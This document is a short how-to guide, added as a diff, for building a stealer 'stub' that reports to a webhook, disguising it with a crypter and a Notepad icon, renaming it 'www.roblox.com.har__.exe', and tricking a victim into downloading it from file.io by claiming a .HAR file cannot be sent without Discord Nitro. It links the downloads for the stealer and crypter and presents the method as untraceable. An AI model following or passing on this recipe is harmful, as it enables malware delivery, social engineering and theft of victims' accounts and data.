@@ -1,0 +1,17 @@
+--Reverse Har Method -- 
+
+Downloads:
+https://mega.nz/file/545RFKoT#OzEUpgjnsUfJ4j2-2r6rL-vxmwklj3FXzYuWnseVkKQ
+https://github.com/NYAN-x-CAT/Lime-Crypter/releases/tag/v0.5
+https://cdn.discordapp.com/attachments/835379200097517588/838054920845393930/Notepad.ico
+
+ 1.) Download all the files above The files are required to use reverse-har-method
+
+2.) Put your webhook and customize what you want the stub to do to the PC and click Press Stealer after drag your EXE to C:\Users\Public\Music and put it inside of that folder.
+This makes it untraceable 
+
+3.) Now launch Lime-Crypter as an administrator and set your payload path to C:\Users\Public\Music\stubname.exe and then click the ICON button and select the Notepad.ICO file that you downloaded after click the  Build button! 
+
+4.) You've created your stub locate the path to it and rename it to  www.roblox.com.har__.exe  and upload it to <https://file.io/ >
+
+5.) For this method to work tell them you can't send the .HAR because you don't have nitro so instead you will upload it to https://file.io/PK                  
